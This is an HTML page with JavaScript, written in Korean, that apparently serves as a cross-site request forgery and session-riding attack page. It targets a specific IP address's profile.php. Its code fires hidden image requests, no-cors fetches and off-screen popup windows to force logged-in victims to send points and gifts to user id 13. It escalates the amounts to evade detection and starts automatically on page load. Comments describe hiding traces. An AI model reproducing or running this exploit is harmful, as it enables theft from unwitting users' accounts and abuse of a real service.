<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>⚡ 세션 탈취 성공 후속 공격</title>
    <style>
        body { 
            font-family: Arial; 
            padding: 20px;
            background: linear-gradient(45deg, #ff4444, #ffaa00);
            color: white;
        }
        .breakthrough {
            background: rgba(255, 255, 255, 0.1);
            border: 3px solid #00ff00;
            padding: 30px;
            margin: 20px 0;
            border-radius: 15px;
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            0% { box-shadow: 0 0 20px #00ff00; }
            100% { box-shadow: 0 0 30px #00ff00, 0 0 40px #00ff00; }
        }
        button {
            background: #ff0000;
            color: white;
            border: none;
            padding: 15px 25px;
            border-radius: 8px;
            cursor: pointer;
            margin: 10px;
            font-size: 16px;
            font-weight: bold;
        }
        .success { background: #00aa00; }
    </style>
</head>
<body>
    <div class="breakthrough">
        <h1>⚡ 돌파구 발견!</h1>
        <h2>🎯 GET 요청 패턴 변화 감지됨</h2>
        
        <p><strong>변화사항:</strong></p>
        <ul>
            <li>✅ 클릭재킹으로 GET 요청 유도 성공</li>
            <li>✅ Set-Cookie 응답 확인됨</li>
            <li>⚡ 서버가 다르게 반응하기 시작함</li>
        </ul>
        
        <button class="success" onclick="exploitGetMethod()">
            🚀 GET 방식 집중 공격
        </button>
        
        <button onclick="chainedAttack()">
            ⛓️ 연쇄 공격 실행
        </button>
        
        <button onclick="sessionRiding()">
            🏄‍♂️ 세션 라이딩 공격
        </button>
    </div>

    <div id="result"></div>

    <script>
        function exploitGetMethod() {
            showResult('🚀 GET 방식 집중 공격 시작...');
            
            // GET 파라미터로 다양한 시도
            const getAttacks = [
                // 기본 공격
                'receiver_id=13&points=100&send_gift=1&gift_type=diamond&message=GET_Attack_1',
                
                // 다른 파라미터명 시도
                'to=13&amount=100&action=send&type=gift&msg=GET_Attack_2',
                'user_id=13&coins=100&transfer=1&category=premium&note=GET_Attack_3',
                
                // 인코딩 우회 시도
                'receiver%5Fid=13&points=100&send%5Fgift=1&gift%5Ftype=diamond',
                
                // 대소문자 변경
                'Receiver_ID=13&POINTS=100&Send_Gift=1&Gift_Type=diamond',
                
                // 추가 파라미터
                'receiver_id=13&points=100&send_gift=1&gift_type=diamond&submit=1&confirm=yes'
            ];
            
            getAttacks.forEach((params, index) => {
                setTimeout(() => {
                    const url = `http://3.36.66.216/profile.php?${params}`;
                    
                    // Image 태그로 요청 (더 은밀)
                    const img = new Image();
                    img.src = url + '&_t=' + Date.now();
                    img.style.display = 'none';
                    document.body.appendChild(img);
                    
                    console.log(`🎯 GET Attack ${index + 1}: ${params.substring(0, 50)}...`);
                }, index * 500);
            });
            
            showResult(`
✅ GET 방식 집중 공격 실행됨!

6가지 다른 파라미터 조합으로 시도:
1. 기본 필드명 조합
2. 대체 필드명 시도  
3. 사용자/코인 변형
4. URL 인코딩 우회
5. 대소문자 변경
6. 추가 확인 파라미터

네트워크 탭에서 응답 확인하세요!
            `);
        }

        function chainedAttack() {
            showResult('⛓️ 연쇄 공격 실행 중...');
            
            // 1단계: 정보 수집
            setTimeout(() => {
                const infoUrl = 'http://3.36.66.216/profile.php?action=info&user_id=13';
                fetch(infoUrl, {mode: 'no-cors'}).catch(() => {});
                console.log('📊 1단계: 정보 수집');
            }, 500);
            
            // 2단계: 작은 금액부터 시도
            setTimeout(() => {
                const smallAttack = 'http://3.36.66.216/profile.php?receiver_id=13&points=1&send_gift=1&gift_type=cake';
                const img1 = new Image();
                img1.src = smallAttack;
                console.log('💰 2단계: 소액 테스트');
            }, 1000);
            
            // 3단계: 점진적 증가
            const amounts = [5, 10, 25, 50, 75, 100];
            amounts.forEach((amount, i) => {
                setTimeout(() => {
                    const url = `http://3.36.66.216/profile.php?receiver_id=13&points=${amount}&send_gift=1&gift_type=coffee&chain=${i+1}`;
                    const img = new Image();
                    img.src = url;
                    console.log(`📈 3단계-${i+1}: ${amount}P 시도`);
                }, 1500 + (i * 300));
            });
            
            showResult('⛓️ 연쇄 공격 진행 중...\n소액부터 점진적으로 증가하여 탐지 회피 시도');
        }

        function sessionRiding() {
            showResult('🏄‍♂️ 세션 라이딩 공격...');
            
            // 여러 창에서 동시 공격
            for(let i = 0; i < 5; i++) {
                setTimeout(() => {
                    const attackWindow = window.open('', `attack_${i}`, 'width=1,height=1,left=-1000,top=-1000');
                    
                    if(attackWindow) {
                        attackWindow.location.href = `http://3.36.66.216/profile.php?receiver_id=13&points=${20 + (i * 10)}&send_gift=1&gift_type=diamond&window=${i}`;
                        
                        // 3초 후 창 닫기
                        setTimeout(() => {
                            try { attackWindow.close(); } catch(e) {}
                        }, 3000);
                    }
                    
                    console.log(`🏄‍♂️ Session Riding ${i + 1}: ${20 + (i * 10)}P`);
                }, i * 200);
            }
            
            showResult(`
🏄‍♂️ 세션 라이딩 공격 실행!

전략:
- 5개 창에서 동시 공격
- 각기 다른 포인트 (20P, 30P, 40P, 50P, 60P)
- 빠른 연속 실행으로 서버 혼란 유도
- 창은 자동으로 닫아서 흔적 제거

목표: 세션 검증 로직의 틈새 공략
            `);
        }

        function showResult(text) {
            document.getElementById('result').innerHTML = 
                '<div class="breakthrough"><pre style="color: #00ff00; font-size: 14px;">' + text + '</pre></div>';
        }

        // 자동으로 GET 공격 시작
        setTimeout(() => {
            exploitGetMethod();
        }, 2000);

        console.log('⚡ 돌파구 발견! GET 패턴 공격 준비됨');
        console.log('🎯 서버 반응이 달라지기 시작함');
    </script>
</body>
</html>
